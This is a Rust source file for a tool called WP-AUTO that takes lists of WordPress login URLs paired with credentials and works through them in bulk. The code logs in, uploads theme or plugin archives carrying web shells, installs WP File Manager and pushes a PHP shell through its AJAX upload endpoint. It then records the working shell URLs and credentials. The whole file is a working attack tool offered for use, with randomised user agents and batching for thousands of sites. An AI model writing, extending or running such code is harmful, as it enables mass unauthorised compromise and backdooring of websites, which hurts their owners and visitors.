/*
 * WP-AUTO: Auto Upload Themes / Plugins / Shell
 * Rewritten from auto.py to Rust
 * Original Python version by t.me/@GrazzMean | https://github.com/fooster1337
 */

use colored::*;
use rand::Rng;
use regex::Regex;
use reqwest::header::USER_AGENT;
use reqwest::multipart;
use serde_json::Value;
use std::fs;
use std::io::{self, BufRead, Write};
use std::path::Path;
use std::sync::Arc;
use tokio::sync::Semaphore;
use tokio::time::Duration;

use crate::common::{build_client, random_user_agent, save_content};

// ─── Config ──────────────────────────────────────────────────────────────────

struct Config {
    themes_zip: String,
    plugins_zip: String,
    shell_content: String,
}

fn load_config() -> Option<Config> {
    let config_text = match fs::read_to_string("config.ini") {
        Ok(t) => t,
        Err(_) => {
            eprintln!("{}", "ERROR: config.ini not found".red());
            return None;
        }
    };

    let section = if cfg!(windows) { "path_windows" } else { "path_linux" };

    let mut themes = String::new();
    let mut plugins = String::new();
    let mut shell_path = String::new();
    let mut current_section = String::new();

    for line in config_text.lines() {
        let line = line.trim();
        if line.starts_with('[') && line.ends_with(']') {
            current_section = line[1..line.len() - 1].to_string();
            continue;
        }
        if let Some((key, value)) = line.split_once('=') {
            let key = key.trim();
            let value = value.trim();
            match (current_section.as_str(), key) {
                (s, "themes") if s == section => themes = value.to_string(),
                (s, "plugin") if s == section => plugins = value.to_string(),
                ("shell", "shell") => shell_path = value.to_string(),
                _ => {}
            }
        }
    }

    if themes.is_empty() || plugins.is_empty() || shell_path.is_empty() {
        eprintln!("{}", "ERROR: config.ini: Missing required values".red());
        return None;
    }

    if !Path::new(&themes).exists() || !Path::new(&plugins).exists() {
        eprintln!(
            "{}",
            format!(
                "ERROR: Files not found: themes={}, plugin={}",
                themes, plugins
            )
            .red()
        );
        return None;
    }

    let shell_content = match fs::read_to_string(&shell_path) {
        Ok(content) => content,
        Err(_) => {
            eprintln!(
                "{}",
                format!("ERROR: Unable to read shell file: {}", shell_path).red()
            );
            return None;
        }
    };

    Some(Config {
        themes_zip: themes,
        plugins_zip: plugins,
        shell_content,
    })
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

fn random_name() -> String {
    let chars = b"abcdefghijklmnopqrstuvwxyz1234567890";
    let mut rng = rand::thread_rng();
    (0..8)
        .map(|_| chars[rng.gen_range(0..chars.len())] as char)
        .collect()
}

/// Parse URL#user@password format
fn parse_domain(raw: &str) -> Option<(String, String, String)> {
    let raw = raw.trim();
    let parts: Vec<&str> = raw.splitn(2, '#').collect();
    if parts.len() != 2 {
        return None;
    }
    let url = parts[0].to_string();
    let cred = parts[1];

    let at_count = cred.matches('@').count();
    if at_count == 0 {
        return None;
    }

    if at_count >= 2 {
        // Password contains @, e.g. user@pass@word
        let first_at = cred.find('@').unwrap();
        let user = &cred[..first_at];
        let pwd = &cred[first_at + 1..];
        Some((url, user.to_string(), pwd.to_string()))
    } else {
        let cred_parts: Vec<&str> = cred.splitn(2, '@').collect();
        Some((url, cred_parts[0].to_string(), cred_parts[1].to_string()))
    }
}

// ─── AutoLogin Struct ────────────────────────────────────────────────────────

struct AutoLogin {
    client: reqwest::Client,
    url: String,
    username: String,
    password: String,
    themes_zip: String,
    plugins_zip: String,
    shell_content: String,
    random_name: String,
    user_agents: Arc<Vec<String>>,
}

impl AutoLogin {
    fn new(
        url: String,
        username: String,
        password: String,
        config: &Config,
        user_agents: Arc<Vec<String>>,
        client: reqwest::Client,
    ) -> Self {
        Self {
            client,
            url,
            username,
            password,
            themes_zip: config.themes_zip.clone(),
            plugins_zip: config.plugins_zip.clone(),
            shell_content: config.shell_content.clone(),
            random_name: random_name(),
            user_agents,
        }
    }

    fn url_user_pwd(&self) -> String {
        format!(
            "{}/wp-login.php#{}@{}",
            self.url, self.username, self.password
        )
    }

    fn ua(&self) -> String {
        random_user_agent(&self.user_agents)
    }

    fn vuln(&self, msg: &str) {
        println!(
            "[{}] {} --> [{}]",
            "#".yellow(),
            self.url_user_pwd(),
            msg.green()
        );
    }

    fn failed(&self, msg: &str) {
        println!(
            "[{}] {} --> [{}]",
            "#".yellow(),
            self.url_user_pwd(),
            msg.red()
        );
    }

    // ── Get Cookies (session init) ───────────────────────────────────────

    async fn get_cookies(&self) -> bool {
        match self
            .client
            .get(&self.url)
            .header(USER_AGENT, self.ua())
            .header("Upgrade-Insecure-Requests", "1")
            .timeout(Duration::from_secs(10))
            .send()
            .await
        {
            Ok(_) => true,
            Err(e) => {
                if e.is_timeout() {
                    self.failed("Timeout");
                } else {
                    self.failed("Error_get_cookies");
                }
                false
            }
        }
    }

    // ── Login Validation ─────────────────────────────────────────────────

    async fn check_valid_login(&self) -> bool {
        let login_url = format!("{}/wp-login.php", self.url);
        let dash_url = format!("{}/wp-admin", self.url);

        for attempt in 0..2 {
            let redirect_to = if attempt == 0 {
                format!("{}/", dash_url)
            } else {
                dash_url.clone()
            };

            let params = [
                ("log", self.username.as_str()),
                ("pwd", self.password.as_str()),
                ("wp-submit", "Log+In"),
                ("redirect_to", redirect_to.as_str()),
                ("testcookie", "1"),
            ];

            match self
                .client
                .post(&login_url)
                .header(USER_AGENT, self.ua())
                .header("Upgrade-Insecure-Requests", "1")
                .form(&params)
                .timeout(Duration::from_secs(10))
                .send()
                .await
            {
                Ok(resp) => {
                    let final_url = resp.url().to_string();
                    let text = resp.text().await.unwrap_or_default();
                    // Must NOT contain login error indicators
                    let has_login_error = text.contains("login_error")
                        || text.contains("user_login")
                        || text.contains("Passwort vergessen")
                        || text.contains("Lost your password")
                        || text.contains("incorrect")
                        || text.contains("not correct");
                    // Must show real dashboard signs OR redirect to wp-admin
                    let has_dashboard = final_url.contains("/wp-admin/")
                        || (text.contains("/wp-admin/admin-ajax.php")
                            && text.contains("adminmenu"));
                    if !has_login_error && has_dashboard {
                        self.vuln("Valid_Login");
                        return true;
                    }
                    self.failed(&format!("Not_Valid_{}", attempt + 1));
                }
                Err(e) => {
                    if e.is_timeout() {
                        self.failed("Timeout");
                    } else {
                        self.failed("Error_when_try_login");
                    }
                    return false;
                }
            }
        }
        false
    }

    // ── Nonce Extraction ─────────────────────────────────────────────────

    async fn get_nonce(&self, nonce_type: &str) -> Option<String> {
        let path = match nonce_type {
            "plugin" => "/wp-admin/plugin-install.php".to_string(),
            "themes" => "/wp-admin/theme-install.php?browse=popular".to_string(),
            "upload" => "/wp-admin/admin.php?page=wp_file_manager".to_string(),
            "wpfilemanager" => {
                "/wp-admin/plugin-install.php?s=file%2520manager&tab=search&type=term".to_string()
            }
            _ => return None,
        };

        let url = format!("{}{}", self.url, path);

        match self
            .client
            .get(&url)
            .header(USER_AGENT, self.ua())
            .header("Upgrade-Insecure-Requests", "1")
            .timeout(Duration::from_secs(10))
            .send()
            .await
        {
            Ok(resp) => {
                let text = resp.text().await.unwrap_or_default();

                match nonce_type {
                    "plugin" | "themes" => {
                        let re = Regex::new(
                            r#"id="_wpnonce" name="_wpnonce" value="([^"]+)""#,
                        )
                        .ok()?;
                        let nonce = re
                            .captures(&text)
                            .and_then(|cap| cap.get(1).map(|m| m.as_str().to_string()));
                        if nonce.is_none() {
                            self.failed("Failed_get_nonce");
                        }
                        nonce
                    }
                    "upload" => {
                        let text = text.replace("\\/", "/");
                        let pattern = format!(
                            r#"var fmfparams = \{{"ajaxurl":"{}/wp-admin/admin-ajax.php","nonce":"([^"]+)""#,
                            regex::escape(&self.url)
                        );
                        let re = Regex::new(&pattern).ok()?;
                        let nonce = re
                            .captures(&text)
                            .and_then(|cap| cap.get(1).map(|m| m.as_str().to_string()));
                        if nonce.is_none() {
                            self.failed("Failed_get_nonce");
                        }
                        nonce
                    }
                    "wpfilemanager" => {
                        // Check if WP File Manager is already installed
                        if text.contains("wp-file-manager/images/wp_file_manager.svg") {
                            self.vuln("Wp_File_Manager_Installed");
                            save_content("wpfilemanager.txt", &self.url_user_pwd()).await;
                            return Some("found".to_string());
                        }
                        let re = Regex::new(
                            r#"var _wpUpdatesSettings = \{"ajax_nonce":"([^"]+)"\};"#,
                        )
                        .ok()?;
                        let nonce = re
                            .captures(&text)
                            .and_then(|cap| cap.get(1).map(|m| m.as_str().to_string()));
                        if nonce.is_none() {
                            self.failed("Failed_get_nonce");
                        }
                        nonce
                    }
                    _ => None,
                }
            }
            Err(e) => {
                if e.is_timeout() {
                    self.failed("Timeout");
                } else {
                    self.failed("Error_get_nonce");
                }
                None
            }
        }
    }

    // ── Upload Themes ────────────────────────────────────────────────────

    async fn upload_themes(&self) -> bool {
        let nonce = match self.get_nonce("themes").await {
            Some(n) => n,
            None => return false,
        };

        let theme_bytes = match fs::read(&self.themes_zip) {
            Ok(b) => b,
            Err(_) => {
                self.failed("Cannot_read_themes_zip");
                return false;
            }
        };

        let form = multipart::Form::new()
            .text("_wpnonce", nonce)
            .text("_wp_http_referer", "/wp-admin/theme-install.php")
            .text("install-theme-submit", "Installer")
            .part(
                "themezip",
                multipart::Part::bytes(theme_bytes)
                    .file_name(format!("{}.zip", self.random_name))
                    .mime_str("multipart/form-data")
                    .unwrap(),
            );

        let upload_url = format!("{}/wp-admin/update.php?action=upload-theme", self.url);

        match self
            .client
            .post(&upload_url)
            .header(USER_AGENT, self.ua())
            .multipart(form)
            .timeout(Duration::from_secs(20))
            .send()
            .await
        {
            Ok(resp) => {
                if resp.status().as_u16() == 200 {
                    self.vuln("Upload_Themes");
                    save_content("success_upload_themes.txt", &self.url_user_pwd()).await;

                    let shell_paths = [
                        format!("/wp-content/themes/{}/wp-themes.php", self.random_name),
                        format!("/wp-content/themes/{}/uploader.php", self.random_name),
                    ];

                    for path in &shell_paths {
                        let shell_url = format!("{}{}", self.url, path);
                        if let Ok(resp) = self
                            .client
                            .get(&shell_url)
                            .header(USER_AGENT, self.ua())
                            .timeout(Duration::from_secs(10))
                            .send()
                            .await
                        {
                            let text = resp.text().await.unwrap_or_default();
                            if text.contains("GrazzMean-Uploader")
                                || text.contains("GrazzMean-Shell")
                            {
                                self.vuln("Shell_uploaded");
                                save_content("shell.txt", &shell_url).await;
                                return true;
                            }
                        }
                    }
                    self.failed("themes_Shell_Not_Uploaded");
                    true // upload succeeded even if shell not verified
                } else {
                    self.failed("themes_Failed");
                    false
                }
            }
            Err(e) => {
                if e.is_timeout() {
                    self.failed("Timeout");
                } else {
                    self.failed("Error_upload_themes");
                }
                false
            }
        }
    }

    // ── Upload Plugins ───────────────────────────────────────────────────

    async fn upload_plugins(&self) -> bool {
        let nonce = match self.get_nonce("plugin").await {
            Some(n) => n,
            None => return false,
        };

        let plugin_bytes = match fs::read(&self.plugins_zip) {
            Ok(b) => b,
            Err(_) => {
                self.failed("Cannot_read_plugin_zip");
                return false;
            }
        };

        let form = multipart::Form::new()
            .text("_wpnonce", nonce)
            .text("_wp_http_referer", "/wp-admin/plugin-install.php")
            .text("install-plugin-submit", "Install Now")
            .part(
                "pluginzip",
                multipart::Part::bytes(plugin_bytes)
                    .file_name(format!("{}.zip", self.random_name))
                    .mime_str("multipart/form-data")
                    .unwrap(),
            );

        let upload_url = format!("{}/wp-admin/update.php?action=upload-plugin", self.url);

        match self
            .client
            .post(&upload_url)
            .header(USER_AGENT, self.ua())
            .multipart(form)
            .timeout(Duration::from_secs(20))
            .send()
            .await
        {
            Ok(resp) => {
                if resp.status().as_u16() == 200 {
                    self.vuln("Upload_Plugins");
                    save_content("success_upload_plugin.txt", &self.url_user_pwd()).await;

                    let shell_paths = [
                        format!("/wp-content/plugins/{}/wp-plugin.php", self.random_name),
                        format!("/wp-content/plugins/{}/uploader.php", self.random_name),
                    ];

                    for path in &shell_paths {
                        let shell_url = format!("{}{}", self.url, path);
                        if let Ok(resp) = self
                            .client
                            .get(&shell_url)
                            .header(USER_AGENT, self.ua())
                            .timeout(Duration::from_secs(10))
                            .send()
                            .await
                        {
                            let text = resp.text().await.unwrap_or_default();
                            if text.contains("GrazzMean-Uploader")
                                || text.contains("GrazzMean-Shell")
                            {
                                self.vuln("Shell_uploaded");
                                save_content("shell.txt", &shell_url).await;
                                return true;
                            }
                        }
                    }
                    self.failed("Plugins_Shell_Not_Uploaded");
                    true
                } else {
                    self.failed("Plugins_Failed");
                    false
                }
            }
            Err(e) => {
                if e.is_timeout() {
                    self.failed("Timeout");
                } else {
                    self.failed("Error_upload_plugins");
                }
                false
            }
        }
    }

    // ── Upload Shell via WP File Manager ─────────────────────────────────

    async fn upload_shell(&self) -> bool {
        let shell_name = format!("{}.php", self.random_name);

        let nonce = match self.get_nonce("upload").await {
            Some(n) => n,
            None => return false,
        };

        // Check if file already exists via elfinder ls
        let check_url = format!(
            "{}/wp-admin/admin-ajax.php?action=mk_file_folder_manager&_wpnonce={}&networkhref=&cmd=ls&target=l1_Lw&intersect[]={}&reqid=18efa290e4235f",
            self.url, nonce, shell_name
        );

        let existing_hash = match self
            .client
            .get(&check_url)
            .header(USER_AGENT, self.ua())
            .timeout(Duration::from_secs(10))
            .send()
            .await
        {
            Ok(resp) => {
                let json: Value = resp.json().await.unwrap_or(Value::Null);
                if let Some(list) = json.get("list").and_then(|l| l.as_object()) {
                    list.keys().next().map(|k| k.to_string())
                } else {
                    None
                }
            }
            Err(_) => None,
        };

        let timestamp = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();

        let mut form = multipart::Form::new()
            .text("reqid", "18efa290e4235f")
            .text("cmd", "upload")
            .text("target", "l1_Lw")
            .text("action", "mk_file_folder_manager")
            .text("_wpnonce", nonce.clone())
            .text("networkhref", "")
            .text("mtime[]", timestamp.to_string());

        if let Some(hash) = existing_hash {
            form = form.text(format!("hashes[{}]", hash), shell_name.clone());
        }

        form = form.part(
            "upload[]",
            multipart::Part::bytes(self.shell_content.as_bytes().to_vec())
                .file_name(shell_name)
                .mime_str("application/x-php")
                .unwrap(),
        );

        let upload_url = format!("{}/wp-admin/admin-ajax.php", self.url);

        match self
            .client
            .post(&upload_url)
            .header(USER_AGENT, self.ua())
            .multipart(form)
            .timeout(Duration::from_secs(15))
            .send()
            .await
        {
            Ok(resp) => {
                if resp.status().as_u16() == 200 {
                    let json: Value = resp.json().await.unwrap_or(Value::Null);
                    if let Some(added) = json.get("added").and_then(|a| a.as_array()) {
                        if !added.is_empty() {
                            if let Some(shell_path) =
                                added[0].get("url").and_then(|u| u.as_str())
                            {
                                // Verify shell is accessible
                                if let Ok(check) = self
                                    .client
                                    .get(shell_path)
                                    .header(USER_AGENT, self.ua())
                                    .timeout(Duration::from_secs(10))
                                    .send()
                                    .await
                                {
                                    let text = check.text().await.unwrap_or_default();
                                    if text.contains("GrazzMean")
                                        || text.contains("shell bypass 403")
                                    {
                                        self.vuln("Upload_Shell");
                                        save_content("shell.txt", shell_path).await;
                                        return true;
                                    }
                                }
                                self.failed("Upload_Shell");
                            }
                        }
                    }
                    self.failed("Upload_Shell_Failed");
                } else {
                    self.failed("Upload_Shell_Failed");
                }
            }
            Err(_) => {
                self.failed("Upload_Shell_Error");
            }
        }
        false
    }

    // ── Install WP File Manager ──────────────────────────────────────────

    async fn install_wpfilemanager(&self) -> bool {
        let nonce = match self.get_nonce("wpfilemanager").await {
            Some(n) => {
                if n == "found" {
                    // Already installed
                    return true;
                }
                n
            }
            None => return false,
        };

        let params = [
            ("slug", "wp-file-manager"),
            ("action", "install-plugin"),
            ("_ajax_nonce", nonce.as_str()),
            ("_fs_nonce", ""),
            ("username", ""),
            ("password", ""),
            ("connection_type", ""),
            ("public_key", ""),
            ("private_key", ""),
        ];

        match self
            .client
            .post(&format!("{}/wp-admin/admin-ajax.php", self.url))
            .header(USER_AGENT, self.ua())
            .header("X-Requested-With", "XMLHttpRequest")
            .form(&params)
            .timeout(Duration::from_secs(30))
            .send()
            .await
        {
            Ok(resp) => {
                if resp.status().as_u16() == 200 {
                    let json: Value = resp.json().await.unwrap_or(Value::Null);
                    self.vuln("Install_WpFileManager");

                    if let Some(activate_url) = json
                        .get("data")
                        .and_then(|d| d.get("activateUrl"))
                        .and_then(|u| u.as_str())
                    {
                        match self
                            .client
                            .get(activate_url)
                            .header(USER_AGENT, self.ua())
                            .timeout(Duration::from_secs(10))
                            .send()
                            .await
                        {
                            Ok(resp) => {
                                let status_ok = resp.status().as_u16() == 200;
                                let text = resp.text().await.unwrap_or_default();
                                if status_ok
                                    || text.contains(
                                        "wp-file-manager/images/wp_file_manager.svg",
                                    )
                                {
                                    self.vuln("Activate_WpFileManager");
                                    save_content("wpfilemanager.txt", &self.url_user_pwd())
                                        .await;
                                    return true;
                                }
                            }
                            Err(_) => {}
                        }
                    }
                    self.failed("Activate_WpFileManager");
                } else {
                    self.failed("WpFileManager_Not_Installed");
                }
            }
            Err(e) => {
                if e.is_timeout() {
                    self.failed("Timeout");
                } else {
                    self.failed("WpFileManager_Error");
                }
            }
        }
        false
    }

    // ── Main Orchestration ───────────────────────────────────────────────

    async fn start(&self) {
        if !self.get_cookies().await {
            return;
        }

        if !self.check_valid_login().await {
            return;
        }

        // Try upload themes first, if fail try plugins
        if !self.upload_themes().await {
            self.upload_plugins().await;
        }

        // Try install WP File Manager and upload shell
        if self.install_wpfilemanager().await {
            self.upload_shell().await;
        }
    }
}

// ─── Constants ───────────────────────────────────────────────────────────────

/// How many URLs to read into memory at once before processing
const BATCH_SIZE: usize = 10_000;

// ─── Count lines without loading file into memory ────────────────────────────

fn count_lines(path: &str) -> u64 {
    let file = match std::fs::File::open(path) {
        Ok(f) => f,
        Err(_) => return 0,
    };
    let reader = io::BufReader::with_capacity(1024 * 1024, file);
    reader.lines().count() as u64
}

// ─── Batch Processing Helper ─────────────────────────────────────────────────

async fn process_auto_batch(
    batch: Vec<String>,
    thread_count: usize,
    user_agents: &Arc<Vec<String>>,
    config: &Arc<Config>,
    processed: &std::sync::atomic::AtomicU64,
    total_lines: u64,
    shared_client: &reqwest::Client,
) {
    let semaphore = Arc::new(Semaphore::new(thread_count));
    let mut handles = vec![];

    for raw_url in batch {
        let sem = semaphore.clone();
        let ua_pool = user_agents.clone();
        let config = config.clone();
        let client = shared_client.clone();

        handles.push(tokio::spawn(async move {
            let _permit = sem.acquire().await.unwrap();

            match parse_domain(&raw_url) {
                Some((url, user, pwd)) => {
                    let base_url = url.replace("/wp-login.php", "");
                    let login = AutoLogin::new(base_url, user, pwd, &config, ua_pool, client);
                    login.start().await;
                }
                None => {
                    println!(
                        "[{}] {} --> [{}]",
                        "#".yellow(),
                        raw_url,
                        "Failed_Parsing".red()
                    );
                }
            }
        }));
    }

    for handle in handles {
        let _ = handle.await;
    }

    let done = processed.load(std::sync::atomic::Ordering::Relaxed);
    if total_lines > 0 {
        eprintln!(
            "{}",
            format!(
                "[*] Progress: {}/{} lines processed ({:.1}%)",
                done,
                total_lines,
                (done as f64 / total_lines as f64) * 100.0
            )
            .cyan()
        );
    }
}

// ─── Public Entry Point ──────────────────────────────────────────────────────

pub async fn run(user_agents: Arc<Vec<String>>) {
    println!(
        "{}",
        "WP-AUTO | Auto Upload Themes / Plugins / Shell".yellow()
    );
    println!(
        "{}",
        "Use format: https://site.com/wp-login.php#admin@password".yellow()
    );
    println!();

    // Load config
    let config = match load_config() {
        Some(c) => Arc::new(c),
        None => return,
    };

    let stdin = io::stdin();

    print!("[Input your list] --> ");
    io::stdout().flush().unwrap();
    let mut list_path = String::new();
    stdin.lock().read_line(&mut list_path).unwrap();
    let list_path = list_path.trim().to_string();

    print!("[Thread] -> ");
    io::stdout().flush().unwrap();
    let mut thread_input = String::new();
    stdin.lock().read_line(&mut thread_input).unwrap();
    let thread_count: usize = thread_input.trim().parse().unwrap_or(10);

    print!("[Batch size] [default: {}] -> ", BATCH_SIZE);
    io::stdout().flush().unwrap();
    let mut batch_input = String::new();
    stdin.lock().read_line(&mut batch_input).unwrap();
    let batch_size: usize = batch_input.trim().parse().unwrap_or(BATCH_SIZE);

    // Build ONE shared client for all tasks — saves thousands of file descriptors
    let shared_client = build_client();

    // Count total lines for progress tracking (fast scan, no data stored)
    eprint!("{}", "[*] Counting lines... ".cyan());
    let total_lines = count_lines(&list_path);
    eprintln!(
        "{}",
        format!("{} entries found", total_lines).green()
    );

    // Open file for streaming — NOT loading into memory
    let file = match std::fs::File::open(&list_path) {
        Ok(f) => f,
        Err(e) => {
            eprintln!("{}", format!("Failed to read list file: {}", e).red());
            return;
        }
    };

    // Use a large buffer for efficient I/O (8MB)
    let reader = io::BufReader::with_capacity(8 * 1024 * 1024, file);

    eprintln!(
        "{}",
        format!(
            "[*] Streaming mode: batch_size={}, threads={}, memory-safe for any file size",
            batch_size, thread_count
        )
        .green()
    );

    let processed = std::sync::atomic::AtomicU64::new(0);
    let mut batch: Vec<String> = Vec::with_capacity(batch_size);
    let mut batch_num: u64 = 0;

    for line in reader.lines() {
        let line = match line {
            Ok(l) => l,
            Err(_) => continue,
        };

        let trimmed = line.trim().to_string();
        if trimmed.is_empty() {
            continue;
        }

        batch.push(trimmed);
        processed.fetch_add(1, std::sync::atomic::Ordering::Relaxed);

        if batch.len() >= batch_size {
            batch_num += 1;
            eprintln!(
                "{}",
                format!(
                    "[*] Processing batch #{} ({} URLs)...",
                    batch_num,
                    batch.len()
                )
                .cyan()
            );

            process_auto_batch(
                std::mem::take(&mut batch),
                thread_count,
                &user_agents,
                &config,
                &processed,
                total_lines,
                &shared_client,
            )
            .await;

            batch = Vec::with_capacity(batch_size);
        }
    }

    // Process remaining URLs in the last (partial) batch
    if !batch.is_empty() {
        batch_num += 1;
        eprintln!(
            "{}",
            format!(
                "[*] Processing final batch #{} ({} URLs)...",
                batch_num,
                batch.len()
            )
            .cyan()
        );

        process_auto_batch(
            batch,
            thread_count,
            &user_agents,
            &config,
            &processed,
            total_lines,
            &shared_client,
        )
        .await;
    }

    eprintln!(
        "{}",
        format!(
            "[✓] Done! Processed {} entries in {} batches.",
            processed.load(std::sync::atomic::Ordering::Relaxed),
            batch_num
        )
        .green()
    );
}
